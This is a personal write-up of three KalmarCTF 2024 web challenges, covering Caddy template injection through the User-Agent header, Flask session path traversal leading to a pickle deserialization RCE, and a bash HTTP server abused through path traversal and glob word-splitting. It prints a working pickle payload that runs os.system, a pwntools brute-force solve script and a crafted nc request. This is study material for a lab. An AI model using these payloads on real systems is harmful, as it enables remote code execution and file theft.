# WEB 
https://ireland.re/posts/KalmarCTF_2024/



## ez v2
```
ua.caddy.chal-kalmarc.tf {
tls internal
templates
import html_reply `User-Agent: {{.Req.Header.Get  "User-Agent"}}`
}

http.caddy.chal-kalmarc.tf {
tls internal
templates
import html_reply "You are connected with {http.request.proto} ({tls_version}, {tls_cipher})."
}
```
the vuln is based around the `User-Agent` that we supply through intercepting with burp
we can supply SSTI through it so our payload is executed server-side

A few knowledge needed to complete the chall is understanding how [caddy](https://caddyserver.com/docs/modules/http.handlers.templates) works 

so we can disclose file with "readFile" and "include".
and with "listFiles" we can list the current directory to find the flag that has been renamed randomly

## --WHAT I'VE LEARNED--
- the vuln: SSTI through user-agent
- knowledge about caddy configuration
- overlooking the caddyfile which is the core clue of this chall, previously i though it was like some docker conf file
-------------------------------

## FileStore

```
from flask import Flask, request, render_template, redirect, session
from flask_session import Session
import os

SESSION_TYPE = 'filesystem'
MAX_CONTENT_LENGTH = 1024 * 1024

app = Flask(__name__)
app.config.from_object(__name__)
Session(app)

@app.route('/', methods=['GET', 'POST'])
def index():
    path = f'static/uploads/{session.sid}' 
    if request.method == 'POST':
        f = request.files['file']
        if '..' in f.filename:
            return "bad", 400
        os.makedirs(path, exist_ok=True)
        f.save(path + '/' + f.filename)
        if not session.get('files'):
            session['files'] = []
        session['files'].append(f.filename)
        return redirect('/')
    return render_template('index.html', path=path, files=session.get('files', []))

if __name__ == "__main__":
    app.run(host='0.0.0.0')
```
given the app.py above my original thoughts are zipslip attack but it didn't turn out to be. i was to focused on how to bypass the '..' restriction
without considering that path Traversal could be achieved through {session.sid} which in this case is not sanitized

another thing to note is that 
``
Setting a flask session to filename means that session files are saved on the server as files. How do we save them? Well, using Pickle serialization of course! 
What’s crazy about this is that Pickle is considered dangerous and if you unpickle a user-controlled value it is essentially game over.
``
AND
``
The Dockerfile also contains: RUN chmod 777 static/uploads flask_session which is a pretty major hint that we are going to need to use this directory traversal to overwrite values in the flask_session directory.
``
i just noticed this after reading the WU

he sets his cookie to 'xxx' and is mapped by the server to '254b2716336df2553ce5c04a934d56e4'

so he made a pickle payload 
``
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('cp /flag.txt /app/static/uploads/abcd.txt')
        return os.system, (cmd,)

def generate_exploit():
    payload = pickle.dumps(RCE(), 0)
    return b"\x00"*4 + payload


with open("254b2716336df2553ce5c04a934d56e4", "wb") as f:
    f.write(generate_exploit())
``
with this he changed the cookie from 'xxx' to '../../flask_session' and uploaded the file
which ultimately overwrite the session.

back to 'xxx' session to open the file which contain the flag

## -- WHAT I'VE LEARNED --
- the vuln is unsecure pickle with path traversal
- read the docker file, some clue like 'RUN chmod 777 static/uploads flask_session' might come in handy
- the serialize pickle is located in flask session that is configured to save files
-------------------------------

## BadAss Server for Hypertext

the chall is sourceless which makes it a little harder. 
First thing first, the only input box is the url, so is try to make an error and the out put was something like
`cat: .....`
notice the chall name.... all capital letters make a word 'bash'. this is a crucial clue

the WU use `/proc/1/cmdline` to yield something like this `socatTCP4-LISTEN:8080,reuseaddr,forkEXEC:/app/badass_server.sh`
explaination by gpt
```
/proc is for directory that has access to kernel data structures and information about running process

/1 is the first process ID (PID) of the init process, which contains is the first process started by the kernel during the boot process.

/cmdline contains the command-line that passed during the init process when it was started
```
after that they use `/app/badass_server.sh` to read the source code
```
#!/bin/bash

# I hope there are no bugs in this source code...

set -e

declare -A request_headers
declare -A response_headers
declare method
declare uri
declare protocol
declare request_body
declare status="200 OK"

abort() {
	declare -gA response_headers
	status="400 Bad Request"
	write_headers
	if [ ! -z ${1+x} ]; then
		>&2 echo "Request aborted: $1"
		echo -en $1
	fi
	exit 1
}

write_headers() {
	response_headers['Connection']='close'
	response_headers['X-Powered-By']='Bash'

	echo -en "HTTP/1.0 $status\r\n"

	for key in "${!response_headers[@]}"; do
		echo -en "${key}: ${response_headers[$key]}\r\n"
	done

	echo -en '\r\n'

	>&2 echo "$(date -u +'%Y-%m-%dT%H:%M:%SZ') $SOCAT_PEERADDR $method $uri $protocol -> $status"
}

receive_request() {
	read -d $'\n' -a request_line

	if [ ${#request_line[@]} != 3 ]; then
		abort "Invalid request line"
	fi

	method=${request_line[0]}

	uri=${request_line[1]}

	protocol=$(echo -n "${request_line[2]}" | sed 's/^\s*//g' | sed 's/\s*$//g')

	if [[ ! $method =~ ^(GET|HEAD)$ ]]; then
		abort "Invalid request method"
	fi

	if [[ ! $uri =~ ^/ ]]; then
		abort 'Invalid URI'
	fi

	if [ $protocol != 'HTTP/1.0' ] && [ $protocol != 'HTTP/1.1' ]; then
		abort 'Invalid protocol'
	fi

	while read -d $'\n' header; do
		stripped_header=$(echo -n "$header" | sed 's/^\s*//g' | sed 's/\s*$//g')

		if [ -z "$stripped_header" ]; then
			break;
		fi

		header_name=$(echo -n "$header" | cut -d ':' -f 1 | sed 's/^\s*//g' | sed 's/\s*$//g' | tr '[:upper:]' '[:lower:]');
		header_value=$(echo -n "$header" | cut -d ':' -f 2- | sed 's/^\s*//g' | sed 's/\s*$//g');

		if [ -z "$header_name" ] || [[ "$header_name" =~ [[:space:]] ]]; then
			abort "Invalid header name";
		fi

		# If header already exists, add value to comma separated list
		if [[ -v request_headers[$header_name] ]]; then
			request_headers[$header_name]="${request_headers[$header_name]}, $header_value"
		else
			request_headers[$header_name]="$header_value"
		fi
	done

	body_length=${request_headers["content-length"]:-0}

	if [[ ! $body_length =~ ^[0-9]+$ ]]; then
		abort "Invalid Content-Length"
	fi

	read -N $body_length request_body
}

handle_request() {
	# Default: serve from static directory
	path="/app/static$uri"
	path_last_character=$(echo -n "$path" | tail -c 1)

	if [ "$path_last_character" == '/' ]; then
		path="${path}index.html"
	fi

	if ! cat "$path" > /dev/null; then
		status="404 Not Found"
	else
		mime_type=$(file --mime-type -b "$path")
		file_size=$(stat --printf="%s" "$path")

		response_headers["Content-Type"]="$mime_type"
		response_headers["Content-Length"]="$file_size"
	fi

	write_headers

	cat "$path" 2>&1
}

receive_request
handle_request
```

some solve script from maple3142

```
from pwn import remote, context
import string
from concurrent.futures import ThreadPoolExecutor


def guess(prefix):
    context.log_level = "error"
    io = remote("chal-kalmarc.tf", 8080)
    io.send(
        f"GET /assets/../../../../ -f\ /app/static/assets/{prefix}*/flag.txt\ -a\ x\r\n\r\n".encode()
    )
    return b"400 Bad Request" in io.recvall()


chrs = string.hexdigits
prefix = ""
while len(prefix) < 32:
    with ThreadPoolExecutor() as executor:
        futures = [executor.submit(guess, prefix + c) for c in chrs]
        for fut, c in zip(futures, chrs):
            if fut.result():
                prefix += c
                print(prefix)
                break
# printf 'GET /assets/../../../../app/static/assets/9df5256fe48859c91122cb92964dbd66/flag.txt HTTP/1.0\r\n\r\n' | nc chal-kalmarc.tf 8080
```
## --WHAT I'VE LEARNED--
- the vuln: Local File Disclosure through url
- another vuln: unquoted var in source code `if [ $protocol != 'HTTP/1.0' ] && [ $protocol != 'HTTP/1.1' ]; then abort 'Invalid protocol' fi` can lead to glob and word splitting in bash
- glob and word splitting in bash
- `/proc/1/cmdline` to read local files
-------------------------------


